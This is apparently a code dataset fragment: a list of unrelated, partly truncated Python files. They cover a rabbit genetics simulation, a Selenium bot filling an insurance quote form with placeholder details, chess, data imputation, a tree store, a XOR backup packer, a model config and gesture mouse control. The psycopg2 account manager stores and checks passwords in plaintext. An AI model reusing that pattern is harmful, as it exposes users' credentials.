rabbits\n                surviving_rabbits.append(rabbit)\n\n    # Ensure at least two rabbits remain alive, prevents program from creating new rabbits if all had died\n    while len(surviving_rabbits) < 2:\n        new_rabbit_allele = random.choice([\"WW\", \"Ww\", \"ww\"])\n        if new_rabbit_allele == \"WW\" and not has_WW:\n            surviving_rabbits.append(Rabbit(new_rabbit_allele))\n            has_WW = True\n        elif new_rabbit_allele == \"ww\" and not has_ww:\n            surviving_rabbits.append(Rabbit(new_rabbit_allele))\n            has_ww = True\n        elif new_rabbit_allele == \"Ww\" and not has_Ww:\n            surviving_rabbits.append(Rabbit(new_rabbit_allele))\n            has_Ww = True\n\n    # Reproduce and create offspring with a limit, this was implemented as the population seemed to explode exponentially anytime it got bigger than 30\n    offspring_limit = 50  # Limit can be adjusted here\n    offspring = []\n    for _ in range(min(len(surviving_rabbits) * 3, offspring_limit)):\n        parent = random.choice(surviving_rabbits)\n        # Introduce mutation with a small probability\n        if random.random() < 0.07:  # chance of mutation\n            offspring_allele = random.choice([\"WW\", \"Ww\", \"ww\"]) # adds random alleles back into the population to increase perceived randomness\n        else:\n            offspring_allele = random.choice([parent.allele, parent.allele])\n        offspring.append(Rabbit(offspring_allele))\n\n    return offspring\n\n\n\ndef create_results_file():\n    # Create a random number for the file name\n    random_number = random.randint(1, 1000)\n    \n    # Determine the path to the \"Downloads\" directory based on the operating system\n    if platform.system() == \"Windows\":\n        downloads_dir = os.path.join(os.path.expanduser(\"~\"), \"Downloads\")\n    elif platform.system() == \"Darwin\":  # macOS\n        downloads_dir = os.path.join(os.path.expanduser(\"~\"), \"Downloads\")\n    elif platform.system() == \"Linux\":  # Linux\n        downloads_dir = os.path.join(os.path.expanduser(\"~\"), \"Downloads\")\n    else:\n        print(\"Unsupported operating system.\")\n        return\n\n    # Create the file path\n    file_name = f\"rabbit_simulation_{random_number}.csv\"\n    file_path = os.path.join(downloads_dir, file_name)\n\n    # Create the file\n    with open(file_path, \"w\") as file:\n        file.write(\"Generation,WW,Ww,ww\\n\")\n\n    return file_path\n\ndef define_rules():\n    print(\"Phases: \\n 1. When prompted, enter the starting number of Rabbits.\\n 2. The program will display the mix of alleles your rabbits have\\n 3. Everytime you hit enter, 3 copies of the Rabbits will be made from the previous generation. then they will all have a coin flipped to see if they perish.\\n 4. The program repeats from phase 2 at this point.\\n 5. A \\\".csv\\\" file will be created in your \\\"Downloads\\\" folder. The results of your experiments will be saved there.\\n The naming schema will be the addition of a random number from 1-1000 appeneded a file named \\\"bunny_simulation...\\\".\")\n\n\n\n# Program entry point\ndef main():\n    define_rules()\n    # \"try\" blocks will test input for bad data. if someon",
    "from selenium import webdriver\r\nfrom selenium.webdriver.common.keys import Keys\r\nfrom selenium.webdriver.common.by import By\r\nfrom selenium.webdriver.support.ui import Select\r\nfrom selenium.common.exceptions import NoSuchElementException\r\nfrom flask import Flask, render_template, request\r\nimport time\r\n\r\n#### EC2 Config ####\r\nfrom selenium.webdriver.firefox.options import Options\r\noptions = Options()\r\noptions.add_argument(\"--headless\")\r\noptions.add_argument(\"--window-size=1920,1080\")\r\noptions.add_argument('--ignore-certificate-errors-spki-list')\r\n#### EC2 Config ####\r\n\r\napp = Flask(__name__)\r\n\r\ndef insurance_calculator(input_data_regNo, input_data_Usrttl, input_data_dobD, input_data_dobM, input_data_dobY, input_data_eircd, input_data_ptdm, input_data_ptdy):\r\n\r\n  #### Local Config ####\r\n  #driver = webdriver.Firefox()\r\n  #### End of Local Config ####\r\n\r\n  #### EC2 Config ####\r\n  driver = webdriver.Firefox(options=options)\r\n  #### End of EC2 Config ####\r\n\r\n  # Navigate to the webpage\r\n  driver.get(\"https://motor.axa.ie/supervalu/quote-v2/your-details/\")\r\n  time.sleep(2)          \r\n\r\n  # Removes Cookies pop-up\r\n  field_wrapper = driver.find_element(By.ID, \"_evidon_banner\")\r\n  button_input = field_wrapper.find_element(By.CLASS_NAME, \"evidon-banner-declinebutton\")\r\n  button_input.click()\r\n\r\n  # Find the form field with the ID \"reg\"\r\n  reg_field = driver.find_element(By.ID, \"VehicleDetails.VehicleRegistrationNumber\")\r\n\r\n  # Interact with the form fields as needed\r\n  reg_field.send_keys(input_data_regNo)\r\n  reg_field.send_keys(Keys.RETURN)\r\n  time.sleep(5)\r\n\r\n  # Find the form field with the NAME \"correct_car\"\r\n  button_input = driver.find_element(By.XPATH, \"//label[@for='VehicleDetails.ConfirmCarSearchBtn1']\")\r\n  button_input.click()\r\n\r\n  # Find the form field with the NAME \"business_purposes\"\r\n  # Business purposes\r\n  button_input = driver.find_element(By.XPATH, \"//label[@for='VehicleDetails.IsVehicleForBusinessUse2']\")\r\n  button_input.click()\r\n  # Business purposes 2\r\n  button_input = driver.find_element(By.XPATH, \"//label[@for='VehicleDetails.IsVehicleForCommutingUse2']\")\r\n  button_input.click()\r\n\r\n  # Kilometres per year\r\n  select_element = Select(driver.find_element(By.ID, \"VehicleDetails.AnnualDistanceDrivenTypeId\"))\r\n  select_element.select_by_value(\"10227005\")\r\n  \r\n  # Personal Details\r\n  # User's title\r\n  if input_data_Usrttl == \"10106001\":\r\n    button_input = driver.find_element(By.XPATH, '//label[@for=\"ProposerDetails.TitleTypeId1\"]')\r\n  elif input_data_Usrttl == \"10106002\":\r\n    button_input = driver.find_element(By.XPATH, '//label[@for=\"ProposerDetails.TitleTypeId2\"]')\r\n  button_input.click()\r\n  # First name\r\n  text_input = driver.find_element(By.NAME, \"ProposerDetails.FirstName\")\r\n  text_input.click()\r\n  text_input.clear()\r\n  text_input.send_keys(\"Alex\")\r\n  # Last name\r\n  text_input = driver.find_element(By.NAME, \"ProposerDetails.LastName\")\r\n  text_input.click()\r\n  text_input.clear()\r\n  text_input.send_keys(\"Murphy\")\r\n  # DOB Day\r\n  tel_input = driver.find_element(By.NAME, \"ProposerDetails.DateOfBirth.Day\")\r\n  tel_input.click()\r\n  tel_input.clear()\r\n  tel_input.send_keys(input_data_dobD)\r\n  # DOB Month\r\n  tel_input = driver.find_element(By.NAME, \"ProposerDetails.DateOfBirth.Month\")\r\n  tel_input.click()\r\n  tel_input.clear()\r\n  tel_input.send_keys(input_data_dobM)\r\n  # DOB Year\r\n  tel_input = driver.find_element(By.NAME, \"ProposerDetails.DateOfBirth.Year\")\r\n  tel_input.click()\r\n  tel_input.clear()\r\n  tel_input.send_keys(input_data_dobY)\r\n  time.sleep(2)\r\n  # Email address\r\n  text_input = driver.find_element(By.NAME, \"ProposerDetails.EmailAddress\")\r\n  text_input.click()\r\n  text_input.clear()\r\n  text_input.send_keys(\"carinsurancedummy@gmail.com\")\r\n  # Phone number\r\n  tel_input = driver.find_element(By.NAME, \"phone-number\")\r\n  tel_input.click()\r\n  tel_input.clear()\r\n  tel_input.send_keys(\"1231231231\")\r\n  # Status\r\n  button_input = driver.find_element(By.XPATH, \"//label[@for='ProposerDetails.EmploymentStatusTypeId6']\")\r\n  button_input.click()\r\n  # Part-time occupation\r\n  time.sleep(1)\r\n  button_input = driver.find_element(By.XPATH, \"//label[@for='ProposerDetails.PartTimeOccupation2']\")\r\n  button_input.click()\r\n  #Eircode\r\n  text_input = driver.find_element(By.NAME, \"ProposerDetails.AddressDisplayFormatted\")\r\n  text_input.click()\r\n  text_input.clear()\r\n  text_input.send_keys(input_data_eircd)\r\n  # Select Eircode\r\n  time.sleep(1)\r\n  button_input = driver.find_element(By.ID, \"react-autowhatever-1\")\r\n  button_input.click()\r\n  # Household\r\n  button_input = driver.find_element(By.XPATH, \"//label[@for='ProposerDetails.HouseHoldTypeId3']\")\r\n  button_input.click()\r\n\r\n  # Driving History\r\n  # Driving licence\r\n  time.sleep(1)\r\n  button_input = driver.find_element(By.XPATH, \"//label[@for='DrivingHistory.DrivingLicenceTypeId1']\")\r\n  button_input.click()\r\n  # Time with licence\r\n  time.sleep(4)\r\n\r\n  if input_data_dobY == \"2006\":\r\n    button_input = driver.find_element(By.XPATH, \"//label[@for='DrivingHistory.YearsLicenceH",
    "import pygame as pg\nfrom constants import *\nfrom collections import defaultdict\n\nclass ChessBoard:\n    _instance = None\n    def __init__(self, turn, tile):\n        self.turn = turn\n        self.tile = tile\n        self.board = self.init_board()\n        self.white_king, self.black_king = self.init_kings()\n        self.valid_white_moves, self.valid_black_moves = {}, {}\n        self.invalid_white_king_moves, self.invalid_black_king_moves = [], []\n        self.white_pawn_promoted, self.black_pawn_promoted = False, False\n        self.winner = False\n        self.moves_with_no_capturing = 0\n        self.positions = defaultdict(int)\n        self.positions[tuple(tuple(row) for row in self.board)] = 1\n\n    def __new__(cls, *args, **kwargs):\n        if cls._instance is None:\n            cls._instance = super().__new__(cls)\n        return cls._instance\n    \n    def init_kings(self):\n        white_king = None\n        black_king = None\n        for i in range(len(self.board)):\n            for j in range(len(self.board[i])):\n                if (self.board[i][j] and\n                    self.board[i][j].name() == KING and\n                    self.board[i][j].color == BLACK):\n                    \n                    black_king = (j, i)\n\n                elif (self.board[i][j] and\n                    self.board[i][j].name() == KING and\n                    self.board[i][j].color == WHITE):\n\n                    white_king = (j, i)\n        return [white_king, black_king]\n\n    def init_board(self):\n        return [\n            [Rook(BLACK, self), Knight(BLACK, self), Bishop(BLACK, self), Queen(BLACK, self), King(BLACK, self), Bishop(BLACK, self), Knight(BLACK, self), Rook(BLACK, self)],\n            [Pawn(BLACK, self), Pawn(BLACK, self), Pawn(BLACK, self), Pawn(BLACK, self), Pawn(BLACK, self), Pawn(BLACK, self), Pawn(BLACK, self), Pawn(BLACK, self)],\n            [None, None, None, None, None, None, None, None],\n            [None, None, None, None, None, None, None, None],\n            [None, None, None, None, None, None, None, None],\n            [None, None, None, None, None, None, None, None],\n            [Pawn(WHITE, self), Pawn(WHITE, self), Pawn(WHITE, self), Pawn(WHITE, self), Pawn(WHITE, self), Pawn(WHITE, self), Pawn(WHITE, self), Pawn(WHITE, self)],\n            [Rook(WHITE, self), Knight(WHITE, self), Bishop(WHITE, self), Queen(WHITE, self), King(WHITE, self), Bishop(WHITE, self), Knight(WHITE, self), Rook(WHITE, self)]\n        ]\n    \n    def reset(self):\n        self.turn = WHITE\n        self.board = self.init_board() \n        self.white_king, self.black_king = self.init_kings()\n        self.valid_white_moves, self.valid_black_moves = {}, {}\n        self.invalid_white_king_moves, self.invalid_black_king_moves = [], []\n        self.white_pawn_promoted, self.black_pawn_promoted = False, False\n        self.winner = False\n        self.moves_with_no_capturing = 0\n        self.positions = defaultdict(int)\n        self.positions[tuple(tuple(row) for row in self.board)] = 1\n\n    def is_valid_move(self, curr_pos, new_pos):\n        x, y = curr_pos\n        new_x, new_y = new_pos\n    \n        if (self.get_piece(x, y).color == self.turn and\n            (self.get_piece(new_x, new_y) == None or\n            self.get_piece(x, y).color != self.get_piece(new_x, new_y).color) and\n            self.get_piece(x, y).is_valid_move(curr_pos, new_pos)):\n\n            return True\n        return False\n    \n    def castle(self, curr_pos, new_pos):\n        x, y = curr_pos\n        new_x, new_y = new_pos\n        if self.get_piece(x, y).name() == KING and self.get_piece(x, y).color == WHITE:\n            if x - new_x == 2:\n                self.board[y][0] = None\n                self.board[y][new_x + 1] = Rook(WHITE, self)\n            elif x - new_x == -2:\n                self.board[y][len(self.board) - 1] = None\n                self.board[y][new_x - 1] = Rook(WHITE, self)\n            self.white_king = (new_x, new_y)\n        elif self.get_piece(x, y).name() == KING and self.get_piece(x, y).color == BLACK:\n            if x - new_x == 2:\n                self.board[y][0] = None\n                self.board[y][new_x + 1] = Rook(BLACK, self)\n            elif x - new_x == -2:\n                self.board[y][len(self.board) - 1] = None\n                self.board[y][new_x - 1] = Rook(BLACK, self)\n            self.black_king = (new_x, new_y)\n\n    def fifty_move_rule(self, new_pos):\n        new_x, new_y = new_pos\n        if self.board[new_y][new_x]:\n            self.moves_with_no_capturing = 0\n            self.positions[tuple(tuple(row) for row in self.board)] = 1\n        else:\n            self.moves_with_no_capturing += 1\n        if self.moves_with_no_capturing == 50:\n            self.winner = None\n    def threefold_repetition_rule(self):\n        self.positions[tuple(tuple(row) for row in self.board)] += 1\n\n        if max(self.positions.values()) >= 3:\n            self.winner = None\n\n    def calculate_invalid_king_moves(self, color=None):\n        if not color:\n            f",
    "'''\nWe have already seen how we can handle the numerical data with the help of scikit-learn. In the case of Categorical Data things are a little different because we can't use mean, median. So we basically need to choose the most frequent(mode) for filling up the null values in the case of Categorical data.\n\nLet us import pandas and read the csv file initially.\n'''\n\nimport pandas as pd\nimport numpy as np\nfrom sklearn.impute import SimpleImputer\n\ndf=pd.read_csv('Data.csv')\nprint(df)\n\n'''\nOutput \n\n   Country   Age   Salary Purchased\n0   France  44.0  72000.0       Yes\n1    Spain  27.0  48000.0       Yes\n2      NaN  30.0  54000.0       NaN\n3    Spain  38.0  61000.0        No\n4  Germany  40.0      NaN       Yes\n5   France  35.0  58000.0       Yes\n6    Spain   NaN  52000.0        No\n7   France  48.0  79000.0       Yes\n8  Germany  50.0  83000.0        No\n9   France  37.0  67000.0       Yes\nSo we can see we don't have a big dataset and there are NaN or null values present in almost every column. So now how would we handle them?\n\nSimpleImputer is a scikit-learn class which is helpful in handling the missing data in the predictive model dataset. It replaces the NaN values with a specified placeholder. \nIt is implemented by the use of the SimpleImputer() method which takes the following arguments :\n \n\nmissing_values : The missing_values placeholder which has to be imputed. By default is NaN \nstrategy : The data which will replace the NaN values from the dataset. The strategy argument can take the values \u2013 \u2018mean'(default), \u2018median\u2019, \u2018most_frequent\u2019 and \u2018constant\u2019. \nfill_value : The constant value to be given to the NaN data using the constant strategy.  \n\n \n\nSo this instead of using iloc and selecting only the numeric columns we will be selecting all the columns. We will be using most frequent as the strategy parameter because we cannot use mean and median for categorical datas.\n'''\n\nimputer = SimpleImputer(missing_values = np.nan, strategy = 'most_frequent')\ndf.iloc[:,:]=imputer.fit_transform(df.iloc[:,:].values)\n\n'''\nNow if we print the DataFrame(df) we will notice that the null values of the categorical column as well as the numeric column has been removed.\n'''\nprint(df)\n\n'''\nOutput \n\n   Country   Age   Salary Purchased\n0   France  44.0  72000.0       Yes\n1    Spain  27.0  48000.0       Yes\n2   France  30.0  54000.0       Yes\n3    Spain  38.0  61000.0        No\n4  Germany  40.0  48000.0       Yes\n5   France  35.0  58000.0       Yes\n6    Spain  27.0  52000.0        No\n7   France  48.0  79000.0       Yes\n8  Germany  50.0  83000.0        No\n9   France  37.0  67000.0       Yes\n \n\nTo confirm it we can use the isnull().sum() function.\n'''\n\nprint(df.isnull().sum())\n\n'''\nOutput \n\nCountry      0\nAge          0\nSalary       0\nPurchased    0\ndtype: int64\nSo we have removed all the null values and replaced them with the most frequent value of that particular column.\n'''\n",
    "from node import Node\n\n\nclass Store():\n    def __init__(self, node: Node) -> None:\n        self.root: Node | None = node\n\n    def add(self, node: Node, current: Node | None):\n        # Adds a new node to the tree.\n        if self.root == None:\n            self.root = node\n        elif node > current:\n            if current.right == None:\n                current.right = node\n            else:\n                self.add(node, current.right)\n        elif node < current:\n            if current.left == None:\n                current.left = node\n            else:\n                self.add(node, current.left)\n        else:\n            print(\"Duplicate id\")\n\n    def search(self, target: int, current: Node) -> Node | None:\n        # Searchs for a node with the target id.\n        if target < current.id:\n            return self.search(target, current.left)\n        elif target > current.id:\n            return self.search(target, current.right)\n        else:\n            return current\n\n    def parent(self, node: Node, target: Node, parent: Node | None = None) -> Node:\n        # Gets the parent of the entered node.\n        if parent:\n            if node == target:\n                return parent\n            else:\n                if target < node:\n                    return self.parent(node.left, target, node)\n                elif target > node:\n                    return self.parent(node.right, target, node)\n        else:\n            if target < node:\n                return self.parent(node.left, target, node)\n            elif target > node:\n                return self.parent(node.right, target, node)\n\n    def min(self, current):\n        # Gets the min value in the current subtree.\n        if current.left:\n            return self.min(current.left)\n        else:\n            return current\n\n    def max(self, current):\n        # Gets the max value in the current subtree.\n        if current.right:\n            return self.max(current.right)\n        else:\n            return current\n\n    def remove(self, target: int):\n        # Removes a node with the id of target from the tree.\n        # This is honestly not well made made but I really don't want to redo it.\n        if target == self.root.id:\n            if self.root.is_empty():\n                self.root = None\n                return\n            else:\n                if (self.root.left and (self.root.right is None)) or (self.root.right and (self.root.left is None)):\n                    if self.root.left:\n                        self.root = self.root.left\n                        return\n                    else:\n                        self.root = self.root.right\n                        return\n                else:\n                    if self.root > self.root.right:\n                        min =  self.min(self.root.right)\n                        self.remove(min.id)\n                        self.root.data = min.data\n                        self.root.id = min.id\n                        return\n                    else:\n                        max = self.max(self.root.left)\n                        self.remove(max.id)\n                        self.root.data = max.data\n                        self.root.id = max.id\n                        return\n        result = self.search(target, self.root)\n        if result:\n            parent = self.parent(self.root, result)\n            if parent.left == result:\n                if result.is_empty():\n                    parent.left = None\n                elif (result.left and (result.right is None)) or (result.right and (result.left is None)):\n                    if result.left:\n                        parent.left = parent.left.left\n                    else:\n                        parent.left = parent.left.right\n                else:\n                    if result > result.right:\n                        min =  self.min(result.right)\n                        self.remove(min.id)\n                        parent.left.data = min.data\n                        parent.left.id = min.id\n                    else:\n                        max = self.max(result.left)\n                        self.remove(max.id)\n                        parent.left.data = max.data\n                        parent.left.id = max.id\n            else:\n                if result.is_empty():\n                    parent.right = None\n                elif (result.left and (result.right is None)) or (result.right and (result.left is None)):\n                    if result.left:\n                        parent.right = parent.right.left\n                    else:\n                        parent.right = parent.right.right\n                else:\n                    if result > result.right:\n                        min =  self.min(result.right)\n                        self.remove(min.id)\n                        parent.right.data = min.data\n                        parent.right.id = min.id\n                    else:\n                        max = self.max(result.left)\n                        self.remove(max.id)\n          ",
    "#!/usr/bin/env python3\n\nimport argparse\nfrom pathlib import Path\n\nxor_key = \"1A F2 53 18 69 76 B7 A8 00 C2 1A F2 53 18 69 76 B7 A8 00 C2\"\nxor_key = bytes.fromhex(xor_key)\n\n\ndef chunks(lst, n):\n    for i in range(0, len(lst), n):\n        yield lst[i : i + n]\n\n\ndef unpack(src_file: Path, dst_dir: Path):\n    assert src_file.is_file(), \"Source must be a file\"\n\n    with open(src_file, \"rb\") as f:\n\n        def read_xor(size: int):\n            result = bytearray(f.read(size))\n            for i, _ in enumerate(result):\n                result[i] ^= xor_key[i % len(xor_key)]\n            return result\n\n        def get_int(x: bytes):\n            return int.from_bytes(x, \"little\")\n\n        count = get_int(read_xor(4))\n        header_size = 4 * count + 4\n\n        f.seek(0, 0)\n        header = read_xor(header_size)\n        name_list = read_xor(header_size - 4)\n        # TODO: Not currently used\n        thumb_list = read_xor(header_size - 4)\n\n        name_list = [get_int(x) for x in chunks(name_list, 4)]\n        names = []\n        for offset in name_list:\n            f.seek(offset, 0)\n            size = get_int(read_xor(4))\n            names.append(read_xor(size).decode())\n\n        dst_dir.mkdir(exist_ok=True)\n\n        for i, name in enumerate(names):\n            offset = get_int(header[4 * i + 4 : 4 * i + 8])\n            f.seek(offset, 0)\n            size = get_int(read_xor(4))\n            with open(dst_dir / name, \"wb\") as f2:\n                offset = 0\n                while offset < size:\n                    buffer_size = min(0x2000, size - offset)\n                    f2.write(read_xor(buffer_size))\n                    offset += buffer_size\n\n\ndef pack(src_dir: Path, dst_file: Path):\n    assert src_dir.is_dir(), \"Source must be a directory\"\n\n    with open(dst_file, \"wb\") as f:\n\n        def write_xor(data: bytes):\n            result = bytearray(data)\n            for i, _ in enumerate(result):\n                result[i] ^= xor_key[i % len(xor_key)]\n            f.write(result)\n\n        def get_bytes(x: int):\n            return x.to_bytes(4, \"little\")\n\n        files = sorted(f for f in src_dir.glob(\"*\") if f.is_file())\n        file_sizes = [f.stat().st_size for f in files]\n        # TODO: Not currently used\n        thumbs = [bytes(1) for i in range(len(files))]\n\n        count = len(files)\n        header_size = 4 * count + 4\n        name_list_size = 4 * count\n        thumb_list_size = 4 * count\n\n        header = get_bytes(len(files))\n        name_list = bytes(0)\n        thumb_list = bytes(0)\n        offset = header_size + name_list_size + thumb_list_size\n        for i, file in enumerate(files):\n            header += get_bytes(offset)\n            name_offset = offset + 4 + file_sizes[i]\n            name_list += get_bytes(name_offset)\n            thumb_offset = name_offset + 4 + len(file.name)\n            thumb_list += get_bytes(thumb_offset)\n            offset = thumb_offset + 4 + len(thumbs[i])\n\n        write_xor(header)\n        write_xor(name_list)\n        write_xor(thumb_list)\n\n        for i, file in enumerate(files):\n            size = file_sizes[i]\n            write_xor(get_bytes(size))\n            with open(file, \"rb\") as f2:\n                offset = 0\n                while offset < size:\n                    buffer_size = min(0x2000, size - offset)\n                    write_xor(f2.read(buffer_size))\n                    offset += buffer_size\n            write_xor(get_bytes(len(file.name)))\n            write_xor(file.name.encode())\n            write_xor(get_bytes(len(thumbs[i])))\n            write_xor(thumbs[i])\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(\n        description=\"TIGI Software Apps Manager backup tool.\",\n        formatter_class=argparse.ArgumentDefaultsHelpFormatter,\n    )\n    subparsers = parser.add_subparsers(dest=\"cmd\", help=\"Operation to perform.\", required=True)\n\n    pack_parser = subparsers.add_parser(\"pack\", formatter_class=argparse.ArgumentDefaultsHelpFormatter)\n    unpack_parser = subparsers.add_parser(\"unpack\", formatter_class=argparse.ArgumentDefaultsHelpFormatter)\n\n    parser.add_argument(\n        \"input\",\n        type=str,\n        help=\"File to read.\",\n    )\n    parser.add_argument(\n        \"output\",\n        type=str,\n        help=\"File to save.\",\n    )\n\n    args = parser.parse_args()\n    args.input = Path(args.input)\n    args.output = Path(args.output)\n\n    assert args.input.exists(), \"Input file does not exist\"\n    assert args.output.parent.exists(), \"Output file's directory does not exist\"\n\n    if args.cmd == \"unpack\":\n        print(f\"Unpacking {args.input}...\")\n        unpack(args.input, args.output)\n        print(\"Done! Unpacked to:\", args.output)\n    else:\n        print(f\"Packing {args.input}...\")\n        pack(args.input, args.output)\n        print(\"Done! Packed to:\", args.output)\n",
    "import psycopg2\r\nfrom configparser import ConfigParser\r\n\r\nreader = ConfigParser()\r\nreader.read('config.ini')\r\n\r\nclass database_manager:\r\n    def connector(self):\r\n        '''Connects to the given database. Mostly used in other methods'''\r\n        self._conn = psycopg2.connect(\r\n            host = reader['POSTGRESDATA']['HOST'],\r\n            user = reader['POSTGRESDATA']['USER'],\r\n            password = reader['POSTGRESDATA']['PASSWORD'],\r\n            database = reader['POSTGRESDATA']['DB']\r\n        )\r\n        self._curr = self._conn.cursor()\r\n        self._curr.execute('''CREATE TABLE IF NOT EXISTS registered_accounts(\r\n                           id SERIAL PRIMARY KEY,\r\n                           username TEXT,\r\n                           password TEXT\r\n        )''')\r\n\r\n    def disconnect(self):\r\n        '''Disconnects from the database. Used in other methods after connector() to avoid memory leakage'''\r\n        self._curr.close()\r\n        self._conn.close()\r\n    \r\n\r\n    def insert_data(self, name, password):\r\n        '''Registers the account and inserts the data into the database.'''\r\n        self.connector()\r\n        with self._conn:\r\n            self._curr.execute('INSERT INTO registered_accounts(username, password) VALUES(%s, %s)', (name, password))\r\n        self.disconnect()\r\n\r\n\r\n    def get_username(self, name):\r\n        '''Checks if an account exists by selecting the columns with the given username.'''\r\n        self.connector()\r\n        self._curr.execute('SELECT * FROM registered_accounts WHERE username=%s', (name,))\r\n        result = self._curr.fetchall()\r\n        self.disconnect()\r\n        return result\r\n    \r\n    def account_checker(self, name, password):\r\n        '''Checks if an account with the given credentials already exists. (get_username is used in the register page, this authenticates the account on the login page)'''\r\n        self.connector()\r\n        self._curr.execute('SELECT * FROM registered_accounts WHERE username=%s and password=%s', (name, password))\r\n        if self._curr.fetchall():\r\n            self.disconnect()\r\n            return True\r\n    \r\n\r\n",
    "# coding=utf-8\n# Copyright 2022 Facebook AI and The HuggingFace Inc. team. All rights reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\" ViT MSN model configuration\"\"\"\n\n\nfrom ...configuration_utils import PretrainedConfig\nfrom ...utils import logging\n\n\nlogger = logging.get_logger(__name__)\n\nVIT_MSN_PRETRAINED_CONFIG_ARCHIVE_MAP = {\n    \"sayakpaul/vit-msn-base\": \"https://huggingface.co/sayakpaul/vit-msn-base/resolve/main/config.json\",\n    # See all ViT MSN models at https://huggingface.co/models?filter=vit_msn\n}\n\n\nclass ViTMSNConfig(PretrainedConfig):\n    r\"\"\"\n    This is the configuration class to store the configuration of a [`ViTMSNModel`]. It is used to instantiate an ViT\n    MSN model according to the specified arguments, defining the model architecture. Instantiating a configuration with\n    the defaults will yield a similar configuration to that of the ViT\n    [facebook/vit_msn_base](https://huggingface.co/facebook/vit_msn_base) architecture.\n\n    Configuration objects inherit from [`PretrainedConfig`] and can be used to control the model outputs. Read the\n    documentation from [`PretrainedConfig`] for more information.\n\n\n    Args:\n        hidden_size (`int`, *optional*, defaults to 768):\n            Dimensionality of the encoder layers and the pooler layer.\n        num_hidden_layers (`int`, *optional*, defaults to 12):\n            Number of hidden layers in the Transformer encoder.\n        num_attention_heads (`int`, *optional*, defaults to 12):\n            Number of attention heads for each attention layer in the Transformer encoder.\n        intermediate_size (`int`, *optional*, defaults to 3072):\n            Dimensionality of the \"intermediate\" (i.e., feed-forward) layer in the Transformer encoder.\n        hidden_act (`str` or `function`, *optional*, defaults to `\"gelu\"`):\n            The non-linear activation function (function or string) in the encoder and pooler. If string, `\"gelu\"`,\n            `\"relu\"`, `\"selu\"` and `\"gelu_new\"` are supported.\n        hidden_dropout_prob (`float`, *optional*, defaults to 0.0):\n            The dropout probability for all fully connected layers in the embeddings, encoder, and pooler.\n        attention_probs_dropout_prob (`float`, *optional*, defaults to 0.0):\n            The dropout ratio for the attention probabilities.\n        initializer_range (`float`, *optional*, defaults to 0.02):\n            The standard deviation of the truncated_normal_initializer for initializing all weight matrices.\n        layer_norm_eps (`float`, *optional*, defaults to 1e-06):\n            The epsilon used by the layer normalization layers.\n        image_size (`int`, *optional*, defaults to 224):\n            The size (resolution) of each image.\n        patch_size (`int`, *optional*, defaults to 16):\n            The size (resolution) of each patch.\n        num_channels (`int`, *optional*, defaults to 3):\n            The number of input channels.\n        qkv_bias (`bool`, *optional*, defaults to `True`):\n            Whether to add a bias to the queries, keys and values.\n\n    Example:\n\n    ```python\n    >>> from transformers import ViTMSNModel, ViTMSNConfig\n\n    >>> # Initializing a ViT MSN vit-msn-base style configuration\n    >>> configuration = ViTConfig()\n\n    >>> # Initializing a model from the vit-msn-base style configuration\n    >>> model = ViTMSNModel(configuration)\n\n    >>> # Accessing the model configuration\n    >>> configuration = model.config\n    ```\"\"\"\n    model_type = \"vit_msn\"\n\n    def __init__(\n        self,\n        hidden_size=768,\n        num_hidden_layers=12,\n        num_attention_heads=12,\n        intermediate_size=3072,\n        hidden_act=\"gelu\",\n        hidden_dropout_prob=0.0,\n        attention_probs_dropout_prob=0.0,\n        initializer_range=0.02,\n        layer_norm_eps=1e-06,\n        image_size=224,\n        patch_size=16,\n        num_channels=3,\n        qkv_bias=True,\n        **kwargs,\n    ):\n        super().__init__(**kwargs)\n\n        self.hidden_size = hidden_size\n        self.num_hidden_layers = num_hidden_layers\n        self.num_attention_heads = num_attention_heads\n        self.intermediate_size = intermediate_size\n        self.hidden_act = hidden_act\n        self.hidden_dropout_prob = hidden_dropout_prob\n        self.attention_probs_dropout_prob = attention_probs_dropout_prob\n        self.initializer_range = initializer_range\n        self.layer_norm_eps = layer_norm_eps\n        self.image_size = image_size\n        self.patch_size = patch_size\n        self",
    "import cv2\nimport mediapipe as mp\nimport pyautogui\ncap = cv2.VideoCapture(0)\nhand_detector = mp.solutions.hands.Hands()\ndrawing_utils =  mp.solutions.drawing_utils\nscreen_width, screen_height = pyautogui.size()\nindex_y = 0\nwhile True:\n    _, frame = cap.read()\n    frame = cv2.flip(frame, 1)\n    frame_height, frame_width, _ = frame.shape\n    rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)\n    output = hand_detector.process(rgb_frame)\n    hands = output.multi_hand_landmarks\n    if hands:\n        for hand in hands:\n            drawing_utils.draw_landmarks(frame, hand)\n            landmarks = hand.landmark\n            for id, landmark in enumerate(landmarks):\n              x = int(landmark.x*frame_width)\n              y = int(landmark.y*frame_height)\n\n############################for cursor control###################################\n                \n              if id == 8:\n                  cv2.circle(img=frame, center=(x,y), radius=10, color=(0,255, 255))\n                  index_x = screen_width/frame_width*x\n                  index_y = screen_height/frame_height*y\n                  pyautogui.moveTo((x/frame_width)*(screen_width), (y/frame_height)*(screen_height))\n\n\n                \n############################for click function##################################\n              if id == 4:\n                  cv2.circle(img=frame, center=(x,y), radius=10, color=(0,255, 255))\n                  thumb_x = screen_width/frame_width*x\n                  thumb_y = screen_height/frame_height*y\n                  print('Outside', abs(index_y - thumb_y))\n                  if abs(index_y - thumb_y) < 20:\n                      print('click')\n                      pyautogui.click()\n                      pyautogui.sleep(1)\n\n                \n                \n                \n ############################for Double Click function###################################             \n              if id == 12:\n                      cv2.circle(img=frame, center=(x,y), radius=10,color=(255,0,255))\n                      middle_x = screen_width/frame_width*x\n                      middle_y = screen_height/frame_height*y\n                      if abs(middle_y - thumb_y) < 20:\n                          #print('double click')\n                          pyautogui.doubleClick()\n                          pyautogui.sleep(1)\n\n\n############################for Right clicking function###################################                \n               if id == 16:\n                  cv2.circle(img=frame, center=(x, y), radius=10, color=(247, 217, 63))\n                  ring_x = screen_width / frame_width * x\n                  ring_y = screen_height / frame_height * y\n                  if abs(ring_y - thumb_y) < 20:\n                      #print('right click')\n                      pyautogui.mouseDown(button = 'right')\n                      pyautogui.mouseUp(button='right')\n                      